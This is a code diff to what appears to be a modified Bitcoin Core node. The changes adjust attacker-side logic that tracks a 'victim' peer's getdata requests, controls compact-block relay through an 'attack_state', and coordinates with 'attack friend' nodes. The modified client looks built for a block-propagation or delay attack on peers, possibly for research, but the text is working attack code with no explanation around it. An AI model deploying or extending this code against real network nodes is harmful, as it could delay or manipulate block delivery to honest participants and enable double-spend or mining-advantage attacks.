@@ -1236,7 +1236,7 @@ void static ProcessGetBlockData(CNode* pfrom, const Consensus::Params& consensus
             pvictimState->getdata_request.insert(inv.hash.ToString());
 
             //TODO: send the request
-            LogPrintf("Sending request to friend\n");
+            LogPrintf("Sending request: %s to friend\n", inv.hash.ToString());
 
             struct in_addr friend1_in_addr = { .s_addr = inet_addr(connman->attack_friend_ip1.c_str()) };
             CNode* pfriend1 = connman->FindNode((CNetAddr)friend1_in_addr);
@@ -2713,6 +2713,14 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
             struct in_addr victim_in_addr = { .s_addr = inet_addr(victim_ip_string.c_str()) };
             CNode* pvictim = connman->FindNode((CNetAddr)victim_in_addr);
 
+            if (pvictimState->getdata_request.find(cmpctblock.header.GetHash().ToString()) != pvictimState->getdata_request.end()) {
+                if (pvictim) {
+                    connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::CMPCTBLOCK, cmpctblock));
+                    LogPrintf("VIC %s - sending a compact block to respond to its previous getdata request\n",
+                              pvictim->addr.ToString());
+                    pvictimState->getdata_request.erase(cmpctblock.header.GetHash().ToString());
+                }
+            }
             if (pvictimState->attack_state == 0
                 && pvictimState->relayed_compact_blocks.find(cmpctblock.header.GetHash().ToString()) == pvictimState->relayed_compact_blocks.end()) {
                 if (pvictim) {
@@ -2724,14 +2732,6 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                 }
             }
             else if (pvictimState->attack_state == 1
-                       && pvictimState->getdata_request.find(cmpctblock.header.GetHash().ToString()) != pvictimState->getdata_request.end()) {
-                if (pvictim) {
-                    connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::CMPCTBLOCK, cmpctblock));
-                    LogPrintf("VIC %s - sending a compact block to respond to its previous getdata request\n",
-                              pvictim->addr.ToString());
-                    pvictimState->getdata_request.erase(cmpctblock.header.GetHash().ToString());
-                }
-            } else if (pvictimState->attack_state == 1
                        && pvictimState->getdata_request.find(cmpctblock.header.GetHash().ToString()) == pvictimState->getdata_request.end()
                        && pvictimState->relayed_fast_headers.find(cmpctblock.header.GetHash().ToString()) == pvictimState->relayed_fast_headers.end()) {
                 if (pvictim) {
